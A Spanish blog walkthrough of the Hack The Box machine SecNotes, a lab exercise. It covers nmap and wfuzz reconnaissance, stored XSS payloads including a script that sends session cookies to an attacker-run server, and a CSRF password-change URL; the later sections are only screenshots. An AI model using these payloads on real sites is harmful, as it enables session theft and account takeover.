---
title: SecNotes - Hack The Box
categories: [Windows, XSS]
published: true
---

En esta ocasión vamos a estar resolviendo la máquina _SecNotes_ de _Hack The Box_. Es una máquina _Windows_ de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/1.png)

### [](#header-3)Fase De Reconocimiento

Primeramente vamos a lanzar una _traza ICMP_ para saber si la máquina está activa.

```
ping -c 1 10.10.10.97
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/2.png)

Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del _TTL_; en este caso el valor del _TTL_ de la máquina es `127`, por lo que podemos intuir que estamos ante una máquina _Windows_. Recordemos que algunos de los valores referenciales son los siguientes:

| Sistema Operativo (OS) | TTL |
|:-----------------------|:----|
| Linux                  | 64  |
| Windows                | 128 |
| Solaris                | 254 | 

Si nos damos cuenta, en esta ocasión, el valor del _TTL_ es `127` y no `128` como indica la tabla anterior, esto se debe a que en el entorno de máquinas de _Hack The Box_, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el _TTL_ disminuye en una unidad.

```
ping -c 1 10.10.10.97 -R
``` 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/3.png)

Posteriormente, vamos a utilizar la herramienta _Nmap_ para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:

```bash
nmap -p- --open -T5 -v -n 10.10.10.97
```

Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.97
```

A continuación se explican los parámetros utilizados en el escaneo de puertos con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-p\- | Escanea todo el rango de puertos (65535 en total) |
| \-\-open | Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) |
| \-T5 | La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, "generaremos más ruido", pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos `White Hat` | 
| \-v | _Verbose_, reporta lo encontrado por consola |
| \-n | No aplicar _resolución DNS_ |
| \-sS | Escaneo _TCP SYN_ |
| \-min-rate | Emitir paquetes no más lentos que \<valor\> por segundo |
| \-vvv | Triple _verbose_, para obtener mayor información por consola |
| \-Pn | No aplicar _host discovery_ |

Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.

```bash
nmap -sC -sV -p 80,445,8808 10.10.10.97
```

A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-sC | Scripts básicos de enumeración |
| \-sV | Versión y servicios que corren bajo los puertos encontrados |
| \-p | Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) |

Basándonos en la información que nos reporta _Nmap_, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con `HTTP`, así como con `SMB` (Server Message Block).

Empezando por el puerto `80` y `8808` podemos ver que ambas páginas están montadas sobre `IIS` (Internet Information Services), un servidor web para _Microsft Windows_.

Echemos un vistazo desde `WhatWeb`, una herramienta que se encarga de identificar las tecnologías web que se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web.

```bash
whatweb http://10.10.10.97
```

```bash
whatweb http://10.10.10.97:8808
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/4.png)

No hay nada que llame especialmente nuestra atención, más que el redireccionamiento que realiza la primera página hacia lo que parece ser un panel de login, y el título de la segunda página web que es el que viene por defecto al montarla con `IIS`.

En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/5.png)

Lo primero que nos puede venir a la mente al ver un panel de login, sería probar credenciales por defecto, sin embargo este no va a ser el caso.

Algo interesante que voy a comentar solo como curiosidad, es que si ingresamos un nombre de usuario que no existe en el sistema, la página nos devolverá el siguiente mensaje.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/6.png)

Algo que resulta crítico, ya que teniendo control sobre este mensaje, podemos aplicar fuerza bruta sobre el campo `Username` para descubrir usuarios válidos.

Esto sería fácil de ejecutar teniendo a mano herramientas como `Wfuzz` y diccionarios como [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt), que nos provee entre tantas cosas, un diccionario dedicado a nombres de usuario comunes.

```
sudo apt install wfuzz
```

```
git clone https://github.com/danielmiessler/SecLists
```

```bash
wfuzz -c -L -t 400 --hs "No account found with that username." -w /dirección/del/diccionario/SecLists/Usernames/Names/names.txt -d "username=FUZZ&password=noConocemosLaContraseña" http://10.10.10.97
```

| Parámetro | Explicación |
|:----------|:------------|
| \-c | Output colorizado |
| \-L | Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero |
| \-t | Específicamos el número de hilos con el queremos trabajar |
| \-\-hs | Oculta las respuestas con la expresión regular que indiquemos, en este caso controlamos el mensaje de  error |
| \-w | Especificamos el diccionario con el que queremos trabajar |
| \-d | Especificamos la petición por POST |

En caso de que aplicasemos fuerza bruta sobre este campo, descubriríamos que el usuario `tyler` existe dentro del sistema, por lo que ahora tendríamos que aplicar fuerza bruta sobre el campo `Password`, para lo cual ya no tendremos tanta suerte, ya que como veremos más adelante, su contraseña es bastante robusta, por lo que no es suceptible a ataques por diccionario.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/7.png)

Respecto a la segunda página no hay prácticamente nada que podamos hacer, por el momento, al menos.

### [](#header-3)Fase De Explotación

La máquina _SecNotes_ cuenta con dos vías potenciales para realizar la intrusión, una vía [inyecciones SQL](https://mateonitro550.github.io/SQL-Injection) y otra vía [CSRF](https://mateonitro550.github.io/Cross-Site-Request-Forgery-(CSRF)) (Cross-Site Request Forgery).

### [](#header-3)Cross-Site Request Forgery

En vista de que las credenciales por defecto no funcionaron, podemos hacer lo que haría un usuario normal, registrarnos, no todo se trata de romper.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/8.png)

Una vez hemos creado una cuenta, podemos logearnos, y veremos un panel bastante sencillo, pero donde destaca un nombre, `tyler`, un posible usuario potencial, que como mencioné antes, podíamos haberlo descubierto por fuerza bruta.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/9.png)

Por otra parte, vemos que la página nos permite crear una serie de notas, hagámoslo.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/10.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/11.png)

Vemos que el mecanismo de la página es bastante simple, pero si durante el desarrollo de la misma, no se tuvo en consideración ningún tipo de seguridad, quizá esta sea vulnerable a algo tan básico como confiar plenamente en el input del usuario.

Intentemos ya algo no intencionado como una [inyección HTML](https://mateonitro550.github.io/HTML-Injection).

En el campo _Title_ podemos escribir cualquier cosa, aunque perfectamente podría ser la inyección, y en el campo _Note_, colocaremos lo siguiente:

```html
<h1>Una frase cualquiera</h1>
```

De este modo el texto que introduzcamos cambiará su formato al de _header 1_.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/12.png)

O por ejemplo, podemos hacer que nuestro texto se desplace:

```html
<marquee>Una frase cualquiera</marquee>
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/13.png)

Vemos que como atacantes, tenemos la capacidad de inyectar código al propio código fuente de la página web. ¿Qué tal si probamos ahora un [XSS](https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)) (Cross-Site Scripting)?

Igual que antes, en el campo _Title_ podemos escribir cualquier cosa, y en el campo _Note_, colocaremos lo siguiente:

```html
<script>alert("Una frase cualquiera")</script>
```

Podemos observar que cada vez que la página web se recarga, aparece un mensaje con el texto que indicamos anteriormente.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/14.png)

¿Qué tal si en vez de mostrar por pantalla una frase cualquiera, listamos mejor información relevante como la cookie de sesión?

```html
<script>alert(document.cookie)</script>
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/15.png)

Una vez comprobamos que tenemos la capacidad de visualizar nuestra propia cookie de sesión a través de ventanas emergentes (pop-ups), podemos empezar a esbozar una posible vía potencial para la intrusión.

Podemos intentar efectuar un `Cookie Hijacking`, ya que secuestrando la cookie de sesión de otro usuario, si este tiene su sesión abierta, podríamos 'logearnos' sin proporcionar credenciales, únicamente el valor de su cookie.

Adicionalmente, tenemos que pensar en una forma de obtener el valor de la cookie directamente en nuestro equipo de atacantes, ya que de momento, estas ventanas solo son visibles por los usuarios cuando están en su panel de inicio, además de que llaman bastante la atención. Para ello, haremos uso de un [Blind XSS](https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)).

Empezaremos por crear un servidor con `Python`, en el cual recibiremos las cookies de los usuarios cada que estos refresquen, o se encuentren en su panel de inicio.

```bash
sudo python3 -m http.server 80
```

A continuación, crearemos una nota con el siguiente mensaje:

```html
<script>document.write('<img src="http://nuestraDirecciónIP:80/cookie=' + document.cookie + '">')</script>
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/16.png)

En vista de que recibimos nuestra propia cookie de sesión directamente en nuestro equipo, sería solo cuestión de tiempo para hacernos con las cookies de otros usuarios, si los existiera, claro está.

Por obvias razones no existen más clientes que interactuen con el servidor web, a excepción de uno. Si recordamos, el mensaje inicial que aparecía en la página, mencionaba que nos pongamos en contacto con `tyler` a través del botón _Contact Us_; así que lo primero que haremos sera  comprobar si este lee nuestros mensajes, para ello le enviaremos un url que apunte a nuestra máquina.

Es importante mencionar que no podemos ocultar nuestro url con _href_, _acortadores_, _iframe_ o algún otro método, ya que al ser un usuario simulado, este no lo gestiona muy bien. Por su parte, un usuario real, a no ser a que tenga nulos conocimientos de seguridad informática, abriría un enlace que le envía un total desconocido.

Sin cerrar nuestro servidor hosteado con `Python`, a través del botón _Contact Us_, enviaremos el siguiente mensaje para confirmar si `tyler` lee nuestros mensajes:

```html
http://nuestraDirecciónIP:80/tylerEstáPresente
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/17.png)

Vemos que conseguimos una petición por GET por parte de la máquina víctima, por lo que asumimos que este lee nuestros mensajes. Ya con esto podemos pensar que tenemos una posible vía potencial para hacernos con la cookie del usuario. Por lo cual, enviaremos el siguiente mensaje:

```html
<script>document.write('<img src="http://nuestraDirecciónIP:80/cookie=' + document.cookie + '">')</script>
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/18.png)

Para nuestra sorpresa, esto no funciona, así que tendremos que buscar otra alternativa.

Investigando un poco más, si decidimos cambiar nuestra contraseña, nos daremos cuenta que la página no nos solicita nuestra contraseña anterior, o algún otro método de verificación en dos pasos.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/19.png)

Adicionalmente, si revisamos esta petición con `Burp Suite`, nos daremos cuenta que no existe algún tipo de [CSRF Token](https://portswigger.net/web-security/csrf/tokens), por lo que en principio, podríamos modificar esta petición a nuestro antojo.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/20.png)

Lo que haremos será cambiar esta petición que se está tramitando por POST, a GET. De modo que no haya que proporcionar los campos `Password` y `Confirm Password` de forma manual, nosotros lo haremos a través de la propia URL.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/21.png)

Para ello, desde `Burp Suite`, habiendo capturado la petición del cambio de contraseña, simplemente haremos _click derecho_, _Change request method_, y copiaremos la petición por GET.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/22.png)

De esta manera, si añadimos _http://10.10.10.97_ al inicio de la petición que acabamos de copiar, generaremos un URL capaz de cambiar las contraseñas a través del método GET; probémoslo.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/23.png)

Posteriormente, proseguiremos a logearnos con la contraseña que establecimos en el URL.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/24.png)

Ya una vez dentro, encontraremos una nota, con lo que parece ser un usuario y contraseña para un recurso compartido; si recordamos de nuestro escaneo con _Nmap_, el puerto `445` estaba abierto.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/25.png)

### [](#header-3)SQL Injection

Otro vector que podriamos considerar al encontrarnos frente a un panel de login sería probar [Inyecciones SQL](https://mateonitro550.github.io/SQL-Injection). De este modo lo que estamos haciendo es bypassear el panel con expresiones 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/26.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/27.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/28.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/29.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/30.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/31.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/32.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/33.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/34.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/35.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/36.png)

### [](#header-3)Escalada De Privilegios

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/37.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/38.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/39.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/40.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/41.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/42.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/43.png)
